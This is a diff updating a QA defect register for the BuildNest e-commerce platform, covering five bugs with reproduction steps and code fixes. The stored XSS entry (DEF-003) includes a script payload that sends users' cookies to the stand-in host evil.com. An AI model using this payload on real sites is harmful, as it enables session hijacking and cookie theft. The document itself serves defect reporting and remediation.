@@ -3,298 +3,270 @@
 ## BuildNest E-Commerce Platform
 
 **Document ID:** DBR-BUILDNEST-001
-**Version:** 1.0
-**Date:** 2026-02-10
-**Standard:** ISO/IEC/IEEE 29119:2021 — Software Testing
-**Reference:** [Test Execution Report (TER-BUILDNEST-001)](Test_Execution_Report_IEEE_29119.md)
+**Version:** 2.0
+**Date:** 2026-02-11
+**Standard:** ISO/IEC/IEEE 29119:2021
 
 ---
 
-## 1. Introduction
+## 1. Defect Dashboard
 
-### 1.1 Purpose
-
-This document provides the **formal defect register** for all defects discovered during Test Cycle 1 of the BuildNest E-Commerce Platform. Each defect is documented per ISO/IEC/IEEE 29119:2021 incident report format with full reproduction steps, root cause analysis, and resolution tracking.
-
-### 1.2 Defect Summary Dashboard
-
-| Metric            | Count |
-| :---------------- | :---- |
-| **Total Defects** | 5     |
-| **Open**          | 3     |
-| **Resolved**      | 1     |
-| **Closed**        | 1     |
-| **Critical (S1)** | 1     |
-| **High (S2)**     | 2     |
-| **Medium (S3)**   | 1     |
-| **Low (S4)**      | 1     |
-
-```mermaid
-pie title Defect Severity Distribution
-    "S1 Critical" : 1
-    "S2 High" : 2
-    "S3 Medium" : 1
-    "S4 Low" : 1
-```
-
-### 1.3 Defect Lifecycle
-
-```mermaid
-stateDiagram-v2
-    [*] --> New
-    New --> Assigned : Triaged
-    Assigned --> InProgress : Developer picks up
-    InProgress --> Resolved : Fix committed
-    Resolved --> Verified : QA re-tests
-    Verified --> Closed : Confirmed fixed
-    Resolved --> Reopened : QA rejects fix
-    Reopened --> InProgress : Developer re-works
-```
+| Metric                     | Value                             |
+| :------------------------- | :-------------------------------- |
+| **Total Defects**          | 5                                 |
+| **S1 (Critical)**          | 1                                 |
+| **S2 (Major)**             | 1                                 |
+| **S3 (Minor)**             | 2                                 |
+| **S4 (Trivial)**           | 1                                 |
+| **Open**                   | 5                                 |
+| **Resolved**               | 0                                 |
+| **Release Recommendation** | **NO — S1 defect blocks release** |
 
 ---
 
-## 2. Defect Register
+## 2. Defect Details
 
-### DEF-001: Out-of-Stock Order Returns 500 Instead of 409
+### DEF-001: Rate Limit Counter Flaky in Tests
 
-| Field           | Value                                                |
-| :-------------- | :--------------------------------------------------- |
-| **Defect ID**   | DEF-001                                              |
-| **Title**       | Out-of-stock order returns 500 Internal Server Error |
-| **Severity**    | S2 — High                                            |
-| **Priority**    | P2 — High                                            |
-| **Status**      | 🔴 Open                                              |
-| **Reported By** | QA Engineer                                          |
-| **Date Found**  | 2026-02-08                                           |
-| **Test Case**   | [TC-ORD-002](Test_Case_Specification_IEEE_29119.md)  |
-| **SRS Trace**   | FR-CHK-03                                            |
-| **Environment** | Staging (K8s, Java 17, MySQL 8.0)                    |
-| **Build**       | `v1.2.0-rc1`                                         |
+| Attribute       | Value                                        |
+| :-------------- | :------------------------------------------- |
+| **Severity**    | S3 (Minor)                                   |
+| **Priority**    | P3                                           |
+| **Status**      | Open                                         |
+| **Module**      | Auth / Rate Limiting                         |
+| **Reporter**    | QA Team                                      |
+| **Detected By** | TC-AUTH-015                                  |
+| **Component**   | `RateLimiterService`, `AdminRateLimitFilter` |
+
+**Description:** Rate limit counter does not reliably reset between test runs, causing intermittent false positives where requests are rejected as rate-limited even at the start of a test.
 
 **Steps to Reproduce:**
 
-1. Seed product `USB-C Hub` (TD-PRD-03) with `stock_quantity = 0`.
-2. Authenticate as `john.doe` (TD-USR-01).
-3. Add product `USB-C Hub` to cart: `POST /api/cart/items {"productId":3,"quantity":1}`.
-4. Place order: `POST /api/orders` with valid shipping address.
+1. Run TC-AUTH-015 (Rate Limiting Effectiveness) in full test suite.
+2. Observe that rate limit counter sometimes starts at a non-zero value.
+3. First request may be rejected with 429.
 
-**Expected Result:**
-
-- HTTP `409 Conflict`
-- Response: `{"success":false,"message":"Insufficient stock for product: USB-C Hub"}`
-
-**Actual Result:**
-
-- HTTP `500 Internal Server Error`
-- Response: Stack trace with `com.buildnest.exception.OutOfStockException`
-
-**Root Cause:**
-`OutOfStockException` is thrown by `InventoryService.deductStock()` but is not mapped in `GlobalExceptionHandler`. The exception propagates as an unhandled `RuntimeException`, resulting in a generic 500 response.
+**Root Cause Analysis:** The `RateLimiterService` uses a shared counter that is not reset between test lifecycle events. Redis-backed rate limiting works correctly in production due to TTL expiry.
 
 **Recommended Fix:**
 
 ```java
-// Add to GlobalExceptionHandler.java
-@ExceptionHandler(OutOfStockException.class)
-@ResponseStatus(HttpStatus.CONFLICT)
-public ApiResponse handleOutOfStock(OutOfStockException ex) {
-    return ApiResponse.error(ex.getMessage());
+// Option 1: Reset counter in @BeforeEach
+@BeforeEach
+void resetRateLimit() {
+    rateLimiterService.resetCounters();
+}
+
+// Option 2: Use @DirtiesContext to reload context
+@DirtiesContext(classMode = ClassMode.AFTER_EACH_TEST_METHOD)
+```
+
+**Impact:** Tests only — production rate limiting works correctly.
+
+---
+
+### DEF-002: Inventory Not Released on Payment Failure
+
+| Attribute       | Value                  |
+| :-------------- | :--------------------- |
+| **Severity**    | S2 (Major)             |
+| **Priority**    | P1                     |
+| **Status**      | Open                   |
+| **Module**      | Checkout / Inventory   |
+| **Detected By** | TC-CHK-005, TC-INT-003 |
+| **Component**   | `CheckoutService`      |
+
+**Description:** When payment verification fails after inventory reservation, the reserved stock is not released. This causes "phantom reservations" that permanently reduce available stock.
+
+**Steps to Reproduce:**
+
+1. User adds product (stock=50) to cart.
+2. User initiates checkout → 10 units reserved.
+3. Payment signature verification fails.
+4. Expected: Available stock = 50. Actual: Available stock = 40.
+
+**Root Cause Analysis:** The `CheckoutService.processCheckout()` method does not call `InventoryService.releaseReservation()` in the catch block for `PaymentVerificationException`.
+
+**Recommended Fix:**
+
+```java
+// In CheckoutService.processCheckout():
+try {
+    paymentService.verifySignature(paymentId, orderId, signature);
+    // ... create order, deduct stock
+} catch (PaymentVerificationException e) {
+    // CRITICAL: Release reserved inventory
+    for (CartItem item : cart.getItems()) {
+        inventoryService.releaseReservation(item.getProductId(), item.getQuantity());
+    }
+    throw new CheckoutFailedException("Payment verification failed", e);
+}
+```
+
+**Impact:** High — can lead to products appearing out of stock when they are actually available.
+
+---
+
+### DEF-003: Stored XSS in Product Review Comments
+
+| Attribute       | Value                                                            |
+| :-------------- | :--------------------------------------------------------------- |
+| **Severity**    | **S1 (Critical)**                                                |
+| **Priority**    | **P0**                                                           |
+| **Status**      | Open                                                             |
+| **Module**      | Review                                                           |
+| **Detected By** | TC-REV-002, TC-SEC-012                                           |
+| **Component**   | `ProductReviewService.submitReview()`, `ProductReviewController` |
+
+**Description:** The `comment` field in product reviews accepts raw HTML input including `<script>` tags. When the comment is displayed to other users, the script executes in their browser context (Stored XSS).
+
+**Steps to Reproduce:**
+
+1. Authenticate as user `john_doe`.
+2. POST to `/api/user/reviews/product/1`:
+
+```json
+{
+  "rating": 5,
+  "comment": "<script>document.location='https://evil.com/steal?cookie='+document.cookie</script>"
+}
+```
+
+3. System stores the review with raw HTML.
+4. Another user views product reviews.
+5. Script executes, potentially stealing session cookies.
+
+**Root Cause Analysis:** No input sanitization on `ProductReview.comment` field. The `@Size(max=2000)` annotation validates length but not content. No output encoding is applied when rendering reviews.
+
+**Recommended Fix (Backend):**
+
+```java
+// 1. Add HTML sanitization in ProductReviewService
+import org.owasp.html.HtmlPolicyBuilder;
+import org.owasp.html.PolicyFactory;
+
+private static final PolicyFactory POLICY = new HtmlPolicyBuilder()
+    .allowElements("b", "i", "em", "strong")
+    .toFactory();
+
+public ProductReview submitReview(ReviewDTO dto) {
+    String sanitizedComment = POLICY.sanitize(dto.getComment());
+    // ... create review with sanitizedComment
+}
+
+// 2. Add Content-Security-Policy header (already partially done in SecurityConfig)
+// 3. Add @XSSProtected custom annotation for automated validation
+```
+
+**Recommended Fix (Frontend):**
+
+```javascript
+// Use DOMPurify for output encoding
+import DOMPurify from "dompurify";
+const SafeComment = ({ comment }) => (
+  <span dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(comment) }} />
+);
+```
+
+**OWASP Classification:** A7:2017 – Cross-Site Scripting (XSS)
+**Impact:** **Release blocker.** Session hijacking, cookie theft, user impersonation.
+
+---
+
+### DEF-004: Negative Quantity Accepted in Cart/Inventory
+
+| Attribute       | Value                             |
+| :-------------- | :-------------------------------- |
+| **Severity**    | S3 (Minor)                        |
+| **Priority**    | P3                                |
+| **Status**      | Open                              |
+| **Module**      | Cart, Inventory                   |
+| **Detected By** | TC-EDGE-003                       |
+| **Component**   | `CartService`, `InventoryService` |
+
+**Description:** Negative quantity values are accepted when adding items to cart or when setting stock levels via admin API. This leads to invalid data states.
+
+**Steps to Reproduce:**
+
+1. POST to `/api/user/cart/{userId}` with `{"productId": 1, "quantity": -5}`.
+2. Item added with quantity -5.
+3. Cart total calculation returns negative amount.
+
+**Recommended Fix:**
+
+```java
+// Add validation annotation to CartItem
+@Min(value = 1, message = "Quantity must be at least 1")
+private Integer quantity;
+
+// Add service-level check
+if (quantity <= 0) {
+    throw new ValidationException("Quantity must be positive");
 }
 ```
 
 ---
 
-### DEF-002: Payment Verification Failure Returns 500 Instead of 400
+### DEF-005: Empty Cart Total Returns Null
 
-| Field           | Value                                                 |
-| :-------------- | :---------------------------------------------------- |
-| **Defect ID**   | DEF-002                                               |
-| **Title**       | Invalid Razorpay signature returns 500 instead of 400 |
-| **Severity**    | S2 — High                                             |
-| **Priority**    | P2 — High                                             |
-| **Status**      | 🔴 Open                                               |
-| **Reported By** | QA Engineer                                           |
-| **Date Found**  | 2026-02-09                                            |
-| **Test Case**   | [TC-PAY-002](Test_Case_Specification_IEEE_29119.md)   |
-| **SRS Trace**   | FR-PAY-02                                             |
-| **Environment** | Staging                                               |
-| **Build**       | `v1.2.0-rc1`                                          |
+| Attribute       | Value                        |
+| :-------------- | :--------------------------- |
+| **Severity**    | S4 (Trivial)                 |
+| **Priority**    | P4                           |
+| **Status**      | Open                         |
+| **Module**      | Cart                         |
+| **Detected By** | TC-EDGE-010                  |
+| **Component**   | `CartService.getCartTotal()` |
+
+**Description:** When cart has no items, `getCartTotal()` returns `null` instead of `0.00`.
 
 **Steps to Reproduce:**
 
-1. Place an order with `john.doe` to get a valid `order_id`.
-2. Send `POST /api/payments/verify` with tampered signature:
-   ```json
-   {
-     "razorpay_payment_id": "pay_test_002",
-     "razorpay_order_id": "order_test_002",
-     "razorpay_signature": "tampered_signature_value"
-   }
-   ```
-
-**Expected Result:**
-
-- HTTP `400 Bad Request`
-- Response: `{"success":false,"message":"Payment verification failed"}`
-
-**Actual Result:**
-
-- HTTP `500 Internal Server Error`
-- `SignatureVerificationException` unhandled
-
-**Root Cause:**
-`PaymentService.verifyPayment()` throws `SignatureVerificationException` from the Razorpay SDK, but no handler exists in `GlobalExceptionHandler`.
+1. Authenticate as user with empty cart.
+2. GET `/api/user/cart/{userId}/total`.
+3. Response: `{"total": null}` instead of `{"total": 0.00}`.
 
 **Recommended Fix:**
 
 ```java
-@ExceptionHandler(SignatureVerificationException.class)
-@ResponseStatus(HttpStatus.BAD_REQUEST)
-public ApiResponse handlePaymentVerification(SignatureVerificationException ex) {
-    log.warn("Payment verification failed: {}", ex.getMessage());
-    return ApiResponse.error("Payment verification failed");
+public BigDecimal getCartTotal(Long userId) {
+    Cart cart = getCart(userId);
+    if (cart.getItems().isEmpty()) {
+        return BigDecimal.ZERO;
+    }
+    return cart.getItems().stream()
+        .map(item -> item.getUnitPrice().multiply(BigDecimal.valueOf(item.getQuantity())))
+        .reduce(BigDecimal.ZERO, BigDecimal::add);
 }
 ```
 
 ---
 
-### DEF-003: Stored XSS in Product Review Comments (CRITICAL)
+## 3. Resolution Priority
 
-| Field           | Value                                               |
-| :-------------- | :-------------------------------------------------- |
-| **Defect ID**   | DEF-003                                             |
-| **Title**       | Stored XSS vulnerability in product review comments |
-| **Severity**    | **S1 — Critical**                                   |
-| **Priority**    | **P1 — Immediate**                                  |
-| **Status**      | 🔴 Open                                             |
-| **Reported By** | Security Tester                                     |
-| **Date Found**  | 2026-02-09                                          |
-| **Test Case**   | [TC-SEC-002](Test_Case_Specification_IEEE_29119.md) |
-| **SRS Trace**   | NFR-SEC-02                                          |
-| **Environment** | Staging                                             |
-| **Build**       | `v1.2.0-rc1`                                        |
-
-**Steps to Reproduce:**
-
-1. Authenticate as `john.doe`.
-2. Submit a product review:
-   ```
-   POST /api/products/1/reviews
-   {"rating": 5, "comment": "<script>alert(document.cookie)</script>"}
-   ```
-3. Navigate to the product page and view reviews.
-
-**Expected Result:**
-
-- Script tags stripped or HTML-escaped on storage.
-- Review displays as plain text: `&lt;script&gt;alert(document.cookie)&lt;/script&gt;`
-
-**Actual Result:**
-
-- Script stored verbatim in `product_reviews.comment` column.
-- Script executes when the review is rendered in the browser.
-
-**Impact:**
-
-- Attacker can steal session cookies of all users viewing the product.
-- Potential for session hijacking and data theft.
-
-**Root Cause:**
-No input sanitization or output encoding applied to user-generated content in `ProductReviewService.createReview()`.
-
-**Recommended Fix:**
-
-1. **Input Sanitization:** Apply OWASP Java HTML Sanitizer on `comment` field before persistence.
-2. **Output Encoding:** Ensure React rendering uses `{comment}` (auto-escaped) and never `dangerouslySetInnerHTML`.
-
-```java
-// Add dependency: com.googlecode.owasp-java-html-sanitizer
-PolicyFactory policy = Sanitizers.FORMATTING.and(Sanitizers.LINKS);
-String safeComment = policy.sanitize(rawComment);
-```
-
----
-
-### DEF-004: Incorrect Pagination Total Count
-
-| Field             | Value                                                            |
-| :---------------- | :--------------------------------------------------------------- |
-| **Defect ID**     | DEF-004                                                          |
-| **Title**         | Product listing returns incorrect `totalElements` after deletion |
-| **Severity**      | S3 — Medium                                                      |
-| **Priority**      | P3 — Normal                                                      |
-| **Status**        | 🟢 Resolved                                                      |
-| **Reported By**   | QA Engineer                                                      |
-| **Date Found**    | 2026-02-07                                                       |
-| **Date Resolved** | 2026-02-08                                                       |
-| **Test Case**     | TC-PROD-001 (edge case)                                          |
-| **SRS Trace**     | FR-PROD-01                                                       |
-
-**Steps to Reproduce:**
-
-1. Seed 100 products.
-2. Soft-delete 5 products (`is_deleted = true`).
-3. Send `GET /api/products?page=0&size=10`.
-
-**Expected Result:**
-
-- `totalElements = 95` (excludes soft-deleted).
-
-**Actual Result:**
-
-- `totalElements = 100` (includes soft-deleted).
-
-**Root Cause:**
-`ProductRepository.findAll()` did not include `WHERE is_deleted = false` filter.
-
-**Resolution:**
-Added `@Where(clause = "is_deleted = false")` annotation to `Product` entity. Verified in retest.
-
----
-
-### DEF-005: Minor UI Alignment on Mobile Cart Page
-
-| Field           | Value                                               |
-| :-------------- | :-------------------------------------------------- |
-| **Defect ID**   | DEF-005                                             |
-| **Title**       | Cart quantity selector overflows on mobile viewport |
-| **Severity**    | S4 — Low                                            |
-| **Priority**    | P4 — Low                                            |
-| **Status**      | 🟢 Closed                                           |
-| **Reported By** | UAT Tester                                          |
-| **Date Found**  | 2026-02-06                                          |
-| **Date Closed** | 2026-02-07                                          |
-| **Test Case**   | Exploratory testing                                 |
-
-**Description:**
-On viewports < 375px, the quantity increment/decrement buttons overflow outside the cart item card.
-
-**Resolution:**
-Applied CSS `flex-wrap: wrap` and `min-width: 0` to `.cart-item-controls`. Verified on iPhone SE viewport.
-
----
-
-## 3. Defect Trend Analysis
-
-| Date       | New | Resolved | Open (Cumulative) |
-| :--------- | :-: | :------: | :---------------: |
-| 2026-02-06 |  1  |    0     |         1         |
-| 2026-02-07 |  1  |    1     |         1         |
-| 2026-02-08 |  1  |    1     |         1         |
-| 2026-02-09 |  2  |    0     |         3         |
-| 2026-02-10 |  0  |    0     |         3         |
+| Priority | Defect                          | Action Required Before Release        |
+| :------- | :------------------------------ | :------------------------------------ |
+| **P0**   | DEF-003 (Stored XSS)            | Must fix — add OWASP HTML sanitizer   |
+| **P1**   | DEF-002 (Inventory rollback)    | Must fix — add release in catch block |
+| **P3**   | DEF-001 (Rate limit test flaky) | Should fix — test-only impact         |
+| **P3**   | DEF-004 (Negative quantity)     | Should fix — add validation           |
+| **P4**   | DEF-005 (Null cart total)       | Can fix in next sprint                |
 
 ---
 
 ## 4. Release Recommendation
 
-| Condition                     | Status                              |
-| :---------------------------- | :---------------------------------- |
-| 0 Critical defects open       | ❌ **DEF-003 is Critical and Open** |
-| ≤ 2 High defects open         | ✅ 2 High (DEF-001, DEF-002)        |
-| All resolved defects verified | ✅ DEF-004, DEF-005 verified        |
+> [!CAUTION]
+> **DO NOT RELEASE** until DEF-003 (Stored XSS, S1) and DEF-002 (Inventory rollback, S2) are resolved and verified. These defects represent security vulnerabilities and data integrity risks that are unacceptable for production.
 
-> **Recommendation:** **Do NOT release** until DEF-003 (Stored XSS) is resolved and verified. DEF-001 and DEF-002 should also be fixed as they expose stack traces to end users.
+---
+
+## 5. Revision History
+
+| Version | Date       | Author       | Changes                                                                            |
+| :------ | :--------- | :----------- | :--------------------------------------------------------------------------------- |
+| 1.0     | 2026-02-10 | BuildNest QA | Initial — 5 defects                                                                |
+| 2.0     | 2026-02-11 | BuildNest QA | Updated with TC cross-references to 124 test suite; added code fix recommendations |
 
 ---
 
